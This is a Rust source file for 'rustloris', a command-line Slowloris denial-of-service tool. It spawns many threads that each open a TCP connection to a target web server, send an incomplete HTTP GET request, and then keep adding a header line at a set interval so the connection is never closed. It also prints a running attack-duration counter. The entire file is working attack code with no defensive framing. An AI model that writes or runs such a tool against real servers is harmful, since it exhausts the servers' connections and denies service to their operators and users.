extern crate rustc_serialize;
extern crate docopt;
extern crate time;
extern crate url;

use std::net;
use std::io;
use std::io::Write;
use std::thread::sleep;
use std::error::Error;
use std::process::exit;
use std::thread::spawn;
use docopt::Docopt;
use url::Url;

const USAGE: &'static str = "
rustloris

Usage:
    rustloris [options] <target>

Options:
    -h --help                       Show this screen.
    --attack-header=<hdr>           Header to send repeadetly [default: Cookie: a=b].
    --interval=<interval>           Number of seconds to wait between sending [default: 5].
    --connections=<connections>     Number of concurrent connections [default: 10].
";

fn print_usage_and_exit(e :Box<Error>) -> ! {
    print!("{}", e.to_string());
    exit(1)
}

#[derive(Debug, RustcDecodable)]
struct Arguments {
    arg_target :String,
    flag_attack_header :String,
    flag_interval :u64,
    flag_connections :u64,
}

#[derive(Debug,Clone)]
struct AttackOptions {
    connections: u64,
    interval: time::Duration,
    header :String, // The whole HTTP header except the attack header
    attack_header :String,
    target :Target,
}

#[derive(Debug,Clone)]
struct Target {
    host :String,
    path :String,
    port :u16,
}



// This should be done using TryFrom trait, but it is not available in the version I currently have
fn args_to_attack_opts(args :Arguments) -> Result<AttackOptions, Box<Error>> {
    let interval = time::Duration::seconds(args.flag_interval as i64);
    let target = try!(construct_target(args.arg_target));
    let header = construct_header(&target);

    Result::Ok(
        AttackOptions{
            target: target,
            attack_header: args.flag_attack_header.clone(),
            interval: interval,
            header: header,
            connections: args.flag_connections,
        })
}

fn construct_target<'a>(target :String) -> Result<Target, Box<Error>> {
    let target_url = try!(Url::parse(target.as_str()));
    let host = try!(target_url.host_str()
                    .ok_or(io::Error::new(io::ErrorKind::Other, "no host"))
                    .map(|h| h.to_string()));
    let port = target_url.port().unwrap_or(80);
    let path = target_url.path().to_string();
    Result::Ok(
        Target {
            host: host,
            path: path,
            port: port,
        })
}

// Kinda pointless for now, but turn AttackOptions.target to a proper URL later. Make it possible
// to add custom HTTP headers as well
fn construct_header(target :&Target) -> String {
    let hostport = target.host.clone()+":"+target.port.to_string().as_str();
    format!("GET {} HTTP/1.1\r\nHost: {}\r\n{}", target.path.as_str(), hostport.as_str(), "")
}

fn slowloris(opts :AttackOptions) -> Result<(), Box<Error>> {
    let mut stream = try!(net::TcpStream::connect((opts.target.host.as_str(), opts.target.port)));

    try!(stream.write_all(opts.header.as_str().as_bytes()));

    let hdr = format!("{}\r\n", opts.attack_header.as_str());
    loop {
        try!(stream.write_all(hdr.as_bytes()));
        sleep(opts.interval.to_std().unwrap());
    }
}

fn main() {
    let args :Arguments = Docopt::new(USAGE)
        .and_then(|d| d.decode())
        .unwrap_or_else(|e| print_usage_and_exit(From::from(e)));

    let opts = args_to_attack_opts(args)
        .unwrap_or_else(|e| print_usage_and_exit(e));

    let started = time::now();
    for _ in 0..opts.connections {
        let opts = opts.clone();

        let _ = spawn(move || {
            let _ = slowloris(opts);
        });
    }

    println!("Succesfully spawned {} attack threads. ", opts.connections);
    loop {
        let tm = time::now()-started;
        let hours = tm.num_hours();
        let minutes = tm.num_minutes()-hours*60;
        let seconds = tm.num_seconds()-minutes*60;
        print!("Attack duration: {}h {}m {}s   ", hours, minutes, seconds);
        io::stdout().flush().unwrap();
        sleep(time::Duration::seconds(1).to_std().unwrap());
        print!("\r");
        io::stdout().flush().unwrap();
    }

}
